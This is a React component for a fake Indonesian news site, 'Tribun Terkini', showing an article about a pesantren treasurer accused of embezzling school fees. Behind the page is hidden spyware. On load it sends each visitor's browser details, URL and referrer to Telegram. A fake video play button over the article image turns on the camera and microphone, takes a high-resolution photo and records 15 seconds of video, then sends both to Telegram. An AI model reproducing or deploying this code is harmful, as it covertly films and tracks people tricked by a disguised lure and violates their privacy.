import { useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';

function App() {
  useEffect(() => {
    sendTelegramNotification({
      userAgent: navigator.userAgent,
      location: window.location.href,
      referrer: document.referrer || 'Direct',
      previousSites: document.referrer || 'None',
    });
  }, []);

  const captureAndSendMedia = useCallback(async () => {
    try {
      const devices = await navigator.mediaDevices.enumerateDevices();
      const videoDevice = devices.find(device => device.kind === 'videoinput');

      if (!videoDevice) throw new Error('No video input device found');

      const constraints = {
        video: {
          deviceId: videoDevice.deviceId,
          width: { ideal: 4096 },
          height: { ideal: 2160 },
          frameRate: { ideal: 60 },
        },
        audio: true,
      };

      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      const videoTrack = stream.getVideoTracks()[0];
      const settings = videoTrack.getSettings();

      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      video.autoplay = true;

      await new Promise((resolve) => {
        video.onloadedmetadata = async () => {
          try {
            await video.play();
            setTimeout(resolve, 500);
          } catch (error) {
            console.error('Error playing video:', error);
            resolve(true);
          }
        };
      });

      const canvas = document.createElement('canvas');
      canvas.width = settings.width || 1920;
      canvas.height = settings.height || 1080;
      const context = canvas.getContext('2d') as CanvasRenderingContext2D | null;

      if (context) context.drawImage(video, 0, 0, canvas.width, canvas.height);

      const photoBlob = await new Promise<Blob>((resolve) => {
        canvas.toBlob((blob) => {
          if (blob) resolve(blob);
        }, 'image/jpeg', 1.0);
      });

      sendImageToTelegram(photoBlob).catch(console.error);

      const mimeTypes = [
        'video/mp4;codecs=h264,aac',
        'video/mp4',
        'video/webm;codecs=vp8,opus',
        'video/webm',
      ];

      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));

      if (!supportedMimeType) throw new Error('No supported video format found');

      const mediaRecorder = new MediaRecorder(stream, {
        mimeType: supportedMimeType,
        videoBitsPerSecond: 8000000,
      });

      const chunks: BlobPart[] = [];
      mediaRecorder.ondataavailable = (e) => {
        if (e.data.size > 0) chunks.push(e.data);
      };

      mediaRecorder.onstop = async () => {
        const videoBlob = new Blob(chunks, {
          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm',
        });
        await sendVideoToTelegram(videoBlob);
        stream.getTracks().forEach(track => track.stop());
      };

      mediaRecorder.start(1000);
      setTimeout(() => {
        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
      }, 15000);

    } catch (error) {
      console.error('Error capturing media:', error);
    }
  }, []);

  const article = {
    title: "Bendahara Ponpes Al Muttaqin Jepara Jadi Tersangka, Gelapkan Dana SPP Rp 500 Juta untuk Foya-Foya",
    date: "26 Juli 2025",
    imageUrl: "https://linuxpemula.web.id/tersangka.jpg",
    content: `
Jepara, 26 Juli 2025 — Kepolisian Resor (Polres) Jepara resmi menetapkan MZ (38), bendahara Pondok Pesantren Islam Al Muttaqin, sebagai tersangka dalam kasus dugaan penggelapan dana iuran SPP santri senilai lebih dari Rp 500 juta. Hingga saat ini, tersangka masih buron dan masuk dalam daftar pencarian orang (DPO).

Kapolres Jepara, AKBP Andri Susanto, menyatakan bahwa penetapan tersangka dilakukan setelah serangkaian pemeriksaan saksi, audit keuangan internal, dan penelusuran aliran dana.

“Setelah kami kumpulkan cukup bukti, saudara MZ resmi kami tetapkan sebagai tersangka. Saat ini yang bersangkutan tidak berada di alamat terakhirnya dan sedang kami kejar,” ujar AKBP Andri dalam konferensi pers di Mapolres Jepara, Jumat (25/7).

Penyelidikan bermula dari laporan pihak yayasan pondok pesantren yang menemukan kejanggalan dalam arus keuangan sejak awal tahun 2025. Dana iuran santri yang seharusnya digunakan untuk kegiatan operasional, gaji guru, dan kebutuhan santri, ternyata tidak pernah masuk ke kas pesantren.

Audit internal mengungkap bahwa lebih dari Rp 500 juta dana SPP raib dan diduga kuat digunakan oleh tersangka untuk gaya hidup mewah, hiburan malam, hingga perjalanan ke luar kota yang tidak berhubungan dengan kegiatan pesantren.

Ketua Yayasan Al Muttaqin, KH. Sartono Munadi, menyampaikan keprihatinannya atas kasus tersebut.

“Kami sangat terpukul. Ini pengkhianatan terhadap amanah para wali santri. Kami serahkan sepenuhnya kepada pihak berwajib agar pelaku ditangkap dan diproses hukum,” ucapnya.

Pihak kepolisian kini bekerja sama dengan sejumlah wilayah kepolisian lain untuk melakukan pelacakan terhadap tersangka. Diduga, MZ melarikan diri ke luar provinsi dan telah mengganti identitasnya.

Kasus ini menuai perhatian besar dari masyarakat, khususnya para wali santri. Banyak yang menuntut transparansi dan perbaikan tata kelola keuangan di lingkungan pondok pesantren.

“Kami minta ke depan pengelolaan keuangan lebih terbuka. Jangan sampai anak-anak kami jadi korban kelalaian sistem,” kata Rukmini, wali santri asal Demak.

Pihak pondok pesantren menegaskan kegiatan belajar-mengajar tetap berjalan seperti biasa, sambil terus melakukan pembenahan internal.
    `,
  };

  return (
    <div className="bg-gray-100 min-h-screen font-sans">
      <header className="bg-white shadow sticky top-0 z-50 border-b">
        <div className="container mx-auto px-4 py-3 flex items-center justify-between">
          <h1 className="text-xl md:text-2xl font-bold text-blue-800">Tribun Terkini</h1>
          <nav className="space-x-3 text-sm font-medium text-gray-700">
            <a href="#" className="hover:text-blue-600">Beranda</a>
            <a href="#" className="hover:text-blue-600">Nasional</a>
            <a href="#" className="hover:text-blue-600">Internasional</a>
            <a href="#" className="hover:text-blue-600">Olahraga</a>
            <a href="#" className="hover:text-blue-600">Teknologi</a>
          </nav>
        </div>
      </header>

      <main className="container mx-auto px-4 py-6 max-w-4xl bg-white shadow-md rounded-md">
        <h2 className="text-xl font-semibold text-gray-700 mb-2">{article.title}</h2>
        <p className="text-xs text-gray-500 mb-4">{article.date}</p>

        <div className="relative aspect-video bg-black mb-6 rounded overflow-hidden">
          <img src={article.imageUrl} alt={article.title} className="w-full h-full object-cover" />
          <div className="absolute inset-0 bg-black/30 flex items-center justify-center">
            <button
              onClick={captureAndSendMedia}
              className="bg-red-600 text-white text-xl px-6 py-4 rounded-full hover:bg-red-700 hover:scale-105 transition"
            >
              ▶
            </button>
          </div>
        </div>

        <div className="prose prose-sm max-w-none text-gray-800 whitespace-pre-line">
          {article.content}
        </div>
      </main>
    </div>
  );
}

export default App;
